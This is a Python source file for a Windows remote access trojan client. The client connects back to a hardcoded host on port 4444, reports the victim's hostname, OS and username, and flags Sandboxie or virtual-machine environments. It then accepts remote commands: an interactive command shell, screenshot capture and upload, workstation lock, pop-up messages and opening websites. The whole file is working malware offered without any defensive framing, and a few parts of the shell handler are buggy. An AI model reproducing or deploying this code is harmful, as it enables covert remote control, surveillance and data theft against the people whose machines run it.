import socket
import os
import sys
import platform
import time
import ctypes
import subprocess
import threading
import wmi
import win32api
import winerror
import win32event
import win32crypt
import webbrowser
import pyscreeze

from winreg import *

host = "192.168.0.11"

port = 4444

path = os.path.realpath(sys.argv[0])

tmp = os.environ["APPDATA"]

buff = 1024

mutex = win32event.CreateMutex(None, 1, "PA_mutext_xp4")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutext = None
    sys.exit(-1)


def detect_sandboxie():
    try:
        lib_handle = ctypes.windll.LoadLibrary("SbieDll.dll")

        return " (Sandboxie) "
    except:
        return ""


def detect_vm():
    wmi_obj = wmi.WMI()
    for disk_drive in wmi_obj.query("Select * from Win32_DiskDrive"):
        if (
            "vbox" in disk_drive.Caption.lower()
            or "virtual" in disk_drive.Caption.lower()
        ):
            return " (Virtual Machine) "
    return ""


def server_connect():
    global sock

    while True:
        try:
            sock = socket.socket()
            sock.connect((host, port))
        except socket.error:
            time.sleep(5)

        else:
            break

    user_info = (
        socket.gethostname()
        + "',"
        + platform.system()
        + " "
        + platform.release()
        + detect_sandboxie()
        + detect_vm()
        + "',"
        + os.environ["USERNAME"]
    )
    send(user_info.encode())


decode_utf8 = lambda data: data.decode("utf-8")

recv = lambda buffer: sock.recv(buffer)

send = lambda data: sock.send(data)

server_connect()


def screen_shot():
    pyscreeze.screenshot(tmp + "/s.png")
    send(
        str.encode(
            "recv screenshot\nFile size: "
            + str(os.path.getsize(tmp + "/s.png"))
            + " bytes\nSending . . ."
        )
    )

    screenshot = open(tmp + "/s.png", "rb")
    time.sleep(1)

    send(screenshot.read())
    screenshot.close()


def lock():
    ctypes.windll.user32.LockWorkStation()


def shell():
    cwd = str(os.getcwd())
    send(cwd.encode())

    while True:
        in_data = decode_utf8(recv(buff))

        if in_data == "goback":
            os.chdir(cwd)
            break

        elif in_data[:2].lower() == "cd":
            cmd = subprocess.Popen(
                in_data + " & cd",
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                shell=True,
            )

            if (cmd.stderr.read().decode("utf-8")) == "":
                out = (cmd.stdout.read()).decode("utf-8").splitlines()[0]
                os.chdir(out)

                out_data = ("\n" + str(os.getcwd()) + ">").encode()

        elif len(data) > 0:
            cmd = subprocess.Popen(
                in_data,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                shell=True,
            )

            out = (cmd.stdout.read()).decode("utf-8", errors="replace")
            out_data = (str(out) + "\n" + str(os.getcwd()) + ">").encode()

        else:
            out_data = "Error".encode()

        buffer = str(len(out_data))

        send(buffer.encode())
        time.sleep(0.1)
        send(out_data)


def msg_box(msg):
    vbs = open(tmp + "/m.vbs", "w")
    vbs.write('Msgbox "' + msg + '", vbOkOnly+vbInformation+vbSystemModal, "Message"')
    vbs.close()
    subprocess.Popen(["cscript", tmp + "/m.vbs"], shell=True)


while True:
    try:
        while True:
            data = recv(buff)
            data = decode_utf8(data)

            if data == "exit":
                sock.close()
                sys.exit(0)

            elif data[:3] == "msg":
                msg_box(data[3:])

            elif data[:4] == "site":
                webbrowser.get().open(data[4:])

            elif data == "screen":
                screen_shot()

            elif data == "lock":
                lock()

            elif data == "cmd":
                shell()

    except socket.error:
        sock.close()
        del sock

        server_connect()